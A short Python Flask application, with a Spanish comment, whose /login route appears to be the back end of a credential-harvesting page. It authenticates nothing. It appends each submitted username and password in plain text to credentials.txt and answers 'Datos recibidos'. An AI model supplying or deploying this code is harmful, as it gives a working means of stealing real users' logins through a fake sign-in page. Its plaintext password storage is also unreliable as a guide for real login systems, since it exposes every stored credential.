from flask import Flask, request, render_template
import os

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    # Guardar los datos en un archivo
    with open('credentials.txt', 'a') as f:
        f.write(f'Username: {username}, Password: {password}\n')
    return "Datos recibidos"

if __name__ == '__main__':
    app.run(port=5000)
